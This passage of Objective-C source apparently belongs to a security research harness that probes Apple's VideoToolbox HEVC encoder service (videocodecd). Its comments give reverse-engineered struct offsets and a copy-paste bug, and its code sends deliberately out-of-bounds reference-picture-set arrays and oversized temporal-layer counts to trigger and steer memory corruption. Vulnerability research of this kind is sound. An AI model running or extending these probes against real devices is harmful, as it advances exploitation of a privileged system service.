        //      - DeltaIdxMinus1     :CFNumber (AVE_CFDict_GetSInt32 -> [pInfo + 0x04])
        //      - DeltaRPSSign       :CFBoolean (AVE_CFDict_GetBool  -> [pInfo + 0x08])
        //      - AbsDeltaRPSMinus1  :CFNumber (AVE_CFDict_GetSInt32 -> [pInfo + 0x0c])
        //      - UsedByCurrPicFlag  :CFNumber SInt16 bitmask (AVE_CFDict_GetSInt16 -> SIMD 16B [pInfo + 0x10..0x1f])
        //      - UsedDeltaFlag      :CFNumber SInt16 bitmask (AVE_CFDict_GetSInt16 -> SIMD 16B [pInfo + 0x20..0x2f])
        //   3) AVE_Prop_HEVC_GetUserRPSForFaceTime (0x92f13c) copy-paste bug:
        //      Reads [pINS + 0x2e2c] (DPB count) and [pINS + 0x2e30..0x2e74] (UserDPBFramesForFaceTime) instead of pINS + 0x13adc!
        NSMutableArray *s0s = [NSMutableArray array], *s1s = [NSMutableArray array];
        for (int i = 0; i < 2; i++) {
            [s0s addObject:@(i)];
            [s1s addObject:@(i)];
        }
        NSMutableArray *s0Oob24 = [NSMutableArray arrayWithCapacity:24];
        NSMutableArray *s1Oob24 = [NSMutableArray arrayWithCapacity:24];
        for (int i = 0; i < 24; i++) {
            [s0Oob24 addObject:@(i & 3)];
            [s1Oob24 addObject:@(i & 3)];
        }
        NSDictionary *rps0x0 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @0,
            @"NumPositivePics": @0,
            @"DeltaPOCS0Minus1": @[],
            @"UsedByCurrPicS0Flag": @0,
        };
        NSDictionary *rps1x0 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @1,
            @"NumPositivePics": @0,
            @"DeltaPOCS0Minus1": @[ @0 ],
            @"UsedByCurrPicS0Flag": @1,
        };
        NSDictionary *rpsExact2x2 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0s,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1s,
            @"UsedByCurrPicS1Flag": @3,
        };
        NSDictionary *rpsExact2x0 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @0,
            @"DeltaPOCS0Minus1": s0s,
            @"UsedByCurrPicS0Flag": @3,
        };
        NSDictionary *rpsPred1 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanTrue,
            @"DeltaIdxMinus1": @0,
            @"DeltaRPSSign": (id)kCFBooleanFalse,
            @"AbsDeltaRPSMinus1": @0,
            @"UsedByCurrPicFlag": @3,
            @"UsedDeltaFlag": @3,
        };
        // Inner array OOB (count=24 > 16 slots at +0x38 and +0x68, safely contained inside the 0x164-byte RPS struct)
        NSDictionary *rpsInnerOob24 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0Oob24,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1Oob24,
            @"UsedByCurrPicS1Flag": @3,
        };

        // 1A) Run @pre and @post-prep UserRPSForFaceTime (including inner OOB 24 and outer OOB arr5)
        // on a dedicated session `rpsProbeS` so `arr5` OOB write into pINS+0x1406c..0x141d0 does not wedge `s` during EncodeFrame!
        VTCompressionSessionRef rpsProbeS = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)spec, NULL, NULL, NULL, NULL, &rpsProbeS) == noErr && rpsProbeS) {
            VTSessionSetProperty(rpsProbeS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(rpsProbeS, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
            KPH9PrimeRealTime(rpsProbeS);

            OSStatus stPmRps = VTSessionSetProperty(rpsProbeS, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
            OSStatus stForceRps = VTSessionSetProperty(rpsProbeS, CFSTR("ForceSliceRPS"), kCFBooleanTrue);
            OSStatus stPsIds2 = VTSessionSetProperty(rpsProbeS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @1 ]);
            OSStatus stPsIds4 = VTSessionSetProperty(rpsProbeS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @1, @2, @3 ]);
            CFTypeRef psIdsRb = NULL;
            CFIndex psIdsRbCnt = -1;
            if (VTSessionCopyProperty(rpsProbeS, CFSTR("UserParameterSetsIds"), kCFAllocatorDefault, &psIdsRb) == noErr && psIdsRb) {
                if (CFGetTypeID(psIdsRb) == CFArrayGetTypeID()) psIdsRbCnt = CFArrayGetCount((CFArrayRef)psIdsRb);
                CFRelease(psIdsRb);
            }
            OSStatus stPre0x0      = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rps0x0]);
            OSStatus stPre1x0      = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rps1x0]);
            OSStatus stPre2x2      = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsExact2x2]);
            OSStatus stPre2x0      = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsExact2x0]);
            OSStatus stPrePred1    = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsPred1]);
            OSStatus stPreInner24  = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsInnerOob24]);
            OSStatus stPreArr4     = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"),
                                                          (__bridge CFTypeRef)@[rpsExact2x2, rpsExact2x2, rpsExact2x2, rpsExact2x2]);
            OSStatus stPreArr5     = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"),
                                                          (__bridge CFTypeRef)@[rpsExact2x2, rpsExact2x2, rpsExact2x2, rpsExact2x2, rpsExact2x2]);
            KPH9OutAppend(out, @"  set UserRPS @pre (pm1=%d forceRps=%d psIds2=%d psIds4=%d rbPs=%ld): 0x0=%d 1x0=%d 2x2=%d 2x0=%d pred1=%d inOob24=%d arr4=%d arr5=%d\n",
                          (int)stPmRps, (int)stForceRps, (int)stPsIds2, (int)stPsIds4, (long)psIdsRbCnt,
                          (int)stPre0x0, (int)stPre1x0, (int)stPre2x2, (int)stPre2x0, (int)stPrePred1, (int)stPreInner24, (int)stPreArr4, (int)stPreArr5);

            int cqpCounts[] = { 1, 2, 4, 6, 8, 10, 12, 14, 16, 17, 18, 32 };
            NSMutableArray *cqpParts = [NSMutableArray array];
            for (size_t ci = 0; ci < sizeof(cqpCounts) / sizeof(cqpCounts[0]); ci++) {
                int cn = cqpCounts[ci];
                // Scale UserParameterSetsIds length (plen = 3 + ppsCount, where rb = 4 * ppsCount)
                int ppsNeeded = (cn >= 2 && cn <= 16 && (cn % 2) == 0) ? ((cn + 3) / 4) : 1;
                NSMutableArray *psForCqp = [NSMutableArray arrayWithCapacity:(NSUInteger)(3 + ppsNeeded)];
                for (int pi = 0; pi < 3 + ppsNeeded; pi++) [psForCqp addObject:@(pi)];
                VTSessionSetProperty(rpsProbeS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)psForCqp);
                NSMutableArray *numArr = [NSMutableArray arrayWithCapacity:(NSUInteger)cn];
                for (int k = 0; k < cn; k++) [numArr addObject:@((k % 13) - 6)];
                OSStatus cqpSt = VTSessionSetProperty(rpsProbeS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)numArr);
                CFTypeRef cqpRb = NULL;
                CFIndex cqpRbCnt = -1;
                if (VTSessionCopyProperty(rpsProbeS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &cqpRb) == noErr && cqpRb) {
                    if (CFGetTypeID(cqpRb) == CFArrayGetTypeID()) cqpRbCnt = CFArrayGetCount((CFArrayRef)cqpRb);
                    CFRelease(cqpRb);
                }
                [cqpParts addObject:[NSString stringWithFormat:@"n%d=%d(rb=%ld)", cn, (int)cqpSt, (long)cqpRbCnt]];
            }
            KPH9OutAppend(out, @"  ChromaQPIndexOffsetMultiPPS(CFArray<CFNumber>) @pre: %@\n", [cqpParts componentsJoinedByString:@" "]);

            VTSessionSetProperty(rpsProbeS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @0, @0 ]);
            VTSessionSetProperty(rpsProbeS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)@[ @0, @0 ]);
            VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rps1x0]);
            OSStatus prepProbe = VTCompressionSessionPrepareToEncodeFrames(rpsProbeS);
            // Set UserDPBFramesForFaceTime AFTER PrepareToEncodeFrames so SetDPBSnapShot does not fail IOSurfaceLookup (-17691)
            VTSessionSetProperty(rpsProbeS, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)@[ @101, @0, @102, @0 ]);
            OSStatus stSane   = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsExact2x2]);
            OSStatus stPred1  = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsPred1]);
            OSStatus stIn24   = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsInnerOob24]);
            OSStatus stEmpty0 = VTSessionSetProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rps1x0]);
            CFTypeRef rpsRb = NULL;
            OSStatus rpsCopySt = VTSessionCopyProperty(rpsProbeS, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsRb);
            CFIndex rpsRbCount = (rpsCopySt == noErr && rpsRb && CFGetTypeID(rpsRb) == CFArrayGetTypeID())
                                 ? CFArrayGetCount((CFArrayRef)rpsRb) : -1;
            if (rpsRb) CFRelease(rpsRb);
            KPH9OutAppend(out, @"  prepare -> %d\n", (int)prepProbe);
            KPH9OutAppend(out, @"  session set UserRPS @post-prep: 2x2=%d pred1=%d inOob24=%d 1x0=%d rbCount=%ld(dpbAlias)\n",
                          (int)stSane, (int)stPred1, (int)stIn24, (int)stEmpty0, (long)rpsRbCount);
            KPH9SafeTeardown(rpsProbeS);
        }

        // 1B) Clean encode session `s`: encode[0] clean IDR first, then set UserRPS @post-idr and encode P-frames (bounded 900ms)
        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
        (void)prep;
        CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
        if (pb) {
            @synchronized (cbSink) { [cbSink removeAllObjects]; }
            OSStatus e0 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e0 == noErr) KPH9Drain(cbSink, 1, 80);
            NSString *cb0 = nil;
            @synchronized (cbSink) { cb0 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
            OSStatus stSanePost  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsExact2x2]);
            OSStatus stEmptyPost = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rps1x0]);
            KPH9OutAppend(out, @"  encode[0] clean IDR -> %d (%@) | set UserRPS @post-idr 2x2=%d 1x0=%d\n",
                          (int)e0, cb0, (int)stSanePost, (int)stEmptyPost);

            dispatch_semaphore_t encSem = dispatch_semaphore_create(0);
            CVPixelBufferRef pbHold = CVPixelBufferRetain(pb);
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                NSDictionary *fp = @{
                    @"UserRPSForFaceTime": @[rps1x0],
                    @"ForceSliceRPS": (id)kCFBooleanTrue,
                    @"ShortTermRefPicSetSPSFlag": (id)kCFBooleanFalse,
                    @"ShortTermRefPicSetIdx": @0,
                    @"RPSData": rps1x0,
                };
                OSStatus e1 = VTCompressionSessionEncodeFrame(s, pbHold, CMTimeMake(1, 30), kCMTimeInvalid,
                                                              (__bridge CFDictionaryRef)fp, NULL, NULL);
                OSStatus e2 = VTCompressionSessionEncodeFrame(s, pbHold, CMTimeMake(2, 30), kCMTimeInvalid, NULL, NULL, NULL);
                OSStatus e3 = VTCompressionSessionEncodeFrame(s, pbHold, CMTimeMake(3, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionEncodeFrame(s, pbHold, CMTimeMake(4, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionEncodeFrame(s, pbHold, CMTimeMake(5, 30), kCMTimeInvalid, NULL, NULL, NULL);
                if (e1 == noErr || e2 == noErr || e3 == noErr) KPH9Drain(cbSink, 2, 160);
                NSString *cb1 = nil, *cb2 = nil;
                @synchronized (cbSink) {
                    cb1 = cbSink.firstObject ?: @"(no cb)";
                    if (cbSink.count > 1) {
                        NSArray *rest = [cbSink subarrayWithRange:NSMakeRange(1, cbSink.count - 1)];
                        cb2 = [rest componentsJoinedByString:@" | "];
                    } else {
                        cb2 = @"(no cb)";
                    }
                }
                KPH9OutAppend(out, @"  encode[1] frameProps RPS+ForceSliceRPS -> %d (%@)\n", (int)e1, cb1);
                KPH9OutAppend(out, @"  encode[2..3] trailing P-frames -> %d/%d (%@)\n", (int)e2, (int)e3, cb2);
                if (pbHold) CVPixelBufferRelease(pbHold);
                dispatch_semaphore_signal(encSem);
            });
            if (dispatch_semaphore_wait(encSem, dispatch_time(DISPATCH_TIME_NOW, 900 * (int64_t)NSEC_PER_MSEC)) != 0) {
                KPH9OutAppend(out, @"  encode[1..3] after UserRPS @post-idr: STALLED (>900ms in EncodeFrame with active UserRPS)\n");
            }
            CVPixelBufferRelease(pb);
        }

        KPH9SafeTeardownEx(s, retainedSink, NULL);
    });
    [report appendString:s1];

    // -------------------------------------------------------------------------
    // Stage 2: NumberOfTemporalLayers (NTL) Unclamp & Steered x0 Audit
    //   2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 (dyadic clamp -> 3)
    //   2B: raw EncoderUsage=1 without BaseLayerFrameRate (unclamped readback)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 2: NTL unclamp & steered x0 (60/15 clamped vs raw unclamped)"];
    [report appendString:@"\n--- Stage 2: NTL Unclamp & Steered x0 Audit ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
        NSString *s2 = KPH9RunTimed(@"Stage2-NTL", 5000, &vtHung, ^(NSMutableString *out) {
            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int ntlVals[] = { 3, 8, 16000, 16447 };
            KPH9OutAppend(out, @"  [2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 -> dyadic clamp 1+log2(60/15)=3]\n");
            for (int i = 0; i < 4; i++) {
                int ntl = ntlVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                // 1) Usage=1 dyadic clamp readback
                int pre = -1, post = -1;
                OSStatus prep = -999;
                {
                    NSDictionary *spec = @{
                        @"EncoderUsage": @1,
                        @"NumberOfTemporalLayers": @(ntl),
                        @"AllowTemporalCompression": @YES,
                    };
                    VTCompressionSessionRef us = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                   kCMVideoCodecType_HEVC,
                                                   (__bridge CFDictionaryRef)spec,
                                                   NULL, NULL, NULL, NULL, &us) == noErr && us) {
                        VTSessionSetProperty(us, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                        VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                        VTSessionSetProperty(us, CFSTR("RealTime"), kCFBooleanTrue);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                        VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                        CFNumberRef rb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                            CFNumberGetValue(rb, kCFNumberIntType, &pre);
                            CFRelease(rb);
                        }
                        prep = VTCompressionSessionPrepareToEncodeFrames(us);
                        rb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                            CFNumberGetValue(rb, kCFNumberIntType, &post);
                            CFRelease(rb);
                        }
                        KPH9SafeTeardown(us);
                    }
                }
                // 2) Usage=0 non-realtime 60/15 encode so cb#1 st=0 dumps actual VPS/SPS for 60/15
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL, Stage6OutputCallback, res, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  60/15 NTL=%-5d create=%d\n", ntl, (int)st);
                    free(res);
                    continue;
                }
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                VTCompressionSessionPrepareToEncodeFrames(s);
                int u0Post = -1;
                CFNumberRef rb0 = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb0) == noErr && rb0) {
                    CFNumberGetValue(rb0, kCFNumberIntType, &u0Post);
                    CFRelease(rb0);
                }
                OSStatus enc = -1;
                if (pb) {
                    enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                }
                @synchronized ([KPH9EncoderModule class]) {
                    res->closed = 1;
                    KPH9OutAppend(out, @"  60/15 NTL=%-5d x0=0x%016llx prep=%d PRE=%d POST=%d(u0=%d) enc=%d | %s\n",
                                  ntl, x0, (int)prep, pre, post, u0Post, (int)enc, res->first);
                }
                KPH9SafeTeardownEx(s, NULL, res);
            }

            KPH9OutAppend(out, @"  [2B: unclamped Usage=1 readback + fractional 15/30 FPS active encode (safe NTL<=16462)]\n");
            int rawVals[] = { 2, 3, 4, 7, 8, 16000, 16447, 16462 };
            for (int i = 0; i < 8; i++) {
                int ntl = rawVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                // 1) Paired Usage=1 session (no BaseLayerFrameRate) so AVE_PSGen::Init (fn#1816) runs
                //    with unclamped NTL and VTSessionCopyProperty reads back u1Post == ntl.
                int u1Pre = -1, u1Post = -1;
                OSStatus u1Prep = -999;
                {
                    VTCompressionSessionRef us = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                                   NULL, NULL, NULL, NULL, NULL, &us) == noErr && us) {
                        VTSessionSetProperty(us, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                        VTSessionSetProperty(us, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                        VTSessionSetProperty(us, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                        VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                        VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                        CFNumberRef urb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
                            CFNumberGetValue(urb, kCFNumberIntType, &u1Pre);
                            CFRelease(urb);
                        }
                        u1Prep = VTCompressionSessionPrepareToEncodeFrames(us);
                        urb = NULL;
                        if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
                            CFNumberGetValue(urb, kCFNumberIntType, &u1Post);
                            CFRelease(urb);
                        }
                        KPH9SafeTeardown(us);
                    }
                }
                // 2) Active 15/30 fractional FPS encode session: prepare & encode IDR with effNtl=min(ntl,7)
                //    (so cb#1 st=0 info=0x1 emits a real 1..7 sublayer HVCC bitstream without frame drop),
                //    then latch NumberOfTemporalLayers=ntl post-IDR (POST_ENC=ntl).
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL,
                                                         Stage6OutputCallback, res, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  raw   NTL=%-5d create=%d\n", ntl, (int)st);
                    free(res);
                    continue;
                }
                int effNtl = (ntl <= 7) ? ntl : 7;
                VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
                OSStatus uSt = VTSessionSetProperty(s, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
                OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(effNtl));
                int pre = -1, post = -1, postEnc = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                NSString *encStr = @"deferred";
                if (pb && ntl < 16463) {
                    OSStatus enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                    nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                    rb = NULL;
                    if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                        CFNumberGetValue(rb, kCFNumberIntType, &postEnc);
                        CFRelease(rb);
                    }
                    encStr = [NSString stringWithFormat:@"%d(POST_ENC=%d)", (int)enc, postEnc];
                }
                @synchronized ([KPH9EncoderModule class]) {
                    res->closed = 1;
                    int seqSubLayersM1 = (post < 2 && effNtl >= 2) ? (effNtl - 1) : (post - 1);
                    KPH9OutAppend(out, @"  raw   NTL=%-5d x0=0x%016llx u1(PRE=%d,prep=%d,POST=%d) frac15_30=%d set=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) enc=%@ | %s\n",
                                  ntl, x0, u1Pre, (int)u1Prep, u1Post, (int)uSt, (int)nSt, pre, (int)prep, post, seqSubLayersM1, encStr, res->first);
                }
                KPH9SafeTeardownEx(s, NULL, res);
            }

            KPH9OutAppend(out, @"  [2C: extcal Dyadic VPS/SPS Ladder (ExpectedFPS=15*2^(NTL-1) / BaseFPS=15, RealTime=NO)]\n");
            int extNtls[] = { 1, 2, 3, 4, 5, 6, 7, 8 };
            for (int ri = 0; ri < 8; ri++) {
                int ntl = extNtls[ri];
                int expFps = 15 * (1 << (ntl - 1));
                int baseFps = 15;
                Stage6ProbeResult *res = Stage6AllocResult();
                if (!res) continue;
                VTCompressionSessionRef s = NULL;
                if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                               kCMVideoCodecType_HEVC,
                                               NULL, NULL, NULL,
                                               Stage6OutputCallback, res, &s) == noErr && s) {
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(expFps));
                    VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                    OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                    OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                    int post = -1;
                    CFNumberRef rb = NULL;
                    if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                        CFNumberGetValue(rb, kCFNumberIntType, &post);
                        CFRelease(rb);
                    }
                    OSStatus enc = -1;
                    if (pb) {
                        enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                        int w0 = 0;
                        while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                        if (strstr(res->first, "sbuf=NULL") != NULL) {
                            // NTL=8 (1920/15) exceeds 3-bit vps_max_sub_layers_minus1<=6; fallback to 960/15 (7 sublayers) + post-IDR NTL=8
                            VTCompressionSessionRef fbS = NULL;
                            if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                                           NULL, NULL, NULL, Stage6OutputCallback, res, &fbS) == noErr && fbS) {
                                VTSessionSetProperty(fbS, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                                VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
                                VTSessionSetProperty(fbS, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
                                VTSessionSetProperty(fbS, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@960);
                                VTSessionSetProperty(fbS, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@(baseFps));
                                VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
                                VTCompressionSessionPrepareToEncodeFrames(fbS);
                                VTCompressionSessionEncodeFrame(fbS, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                                NULL, (void *)(uintptr_t)0xCAFE, NULL);
                                int w1 = 0;
                                while (!res->targetHit && w1 < 80) { usleep(2000); w1 += 2; }
                                VTSessionSetProperty(fbS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                                KPH9SafeTeardown(fbS);
                            }
                        }
                    }
                    @synchronized ([KPH9EncoderModule class]) {
                        res->closed = 1;
                        NSString *cbCombined = nil;
                        if (res->targetHit && strstr(res->first, "sbuf=NULL") != NULL) {
                            cbCombined = [NSString stringWithFormat:@"%s -> %s", res->first, res->target];
                        } else {
                            cbCombined = [NSString stringWithUTF8String:res->first] ?: @"(no cb)";
                        }
                        KPH9OutAppend(out, @"  ext   NTL=%-2d (%4d/%2d) ntlSet=%d prep=%d POST=%d enc=%d | %@\n",
                                      ntl, expFps, baseFps, (int)nSt, (int)prep, post, (int)enc, cbCombined);
                    }
                    KPH9SafeTeardownEx(s, NULL, res);
                } else {
                    free(res);
                }
            }
            if (pb) CVPixelBufferRelease(pb);
        });
        [report appendString:s2];
    }

    // -------------------------------------------------------------------------
    // Stage 3: UserDPBFramesForFaceTime CFNumber Slot & Cutoff Audit
    // (Strictly CFNumber elements — NSData/NSDictionary trigger uncaught
    // -[_getValue:forType:] SIGABRT in videocodecd -> launchd 320s throttle)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 3: UserDPBFramesForFaceTime CFNumber probe (32..64 boundary)"];
    [report appendString:@"\n--- Stage 3: UserDPBFramesForFaceTime (CFNumber Safe Probe) ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
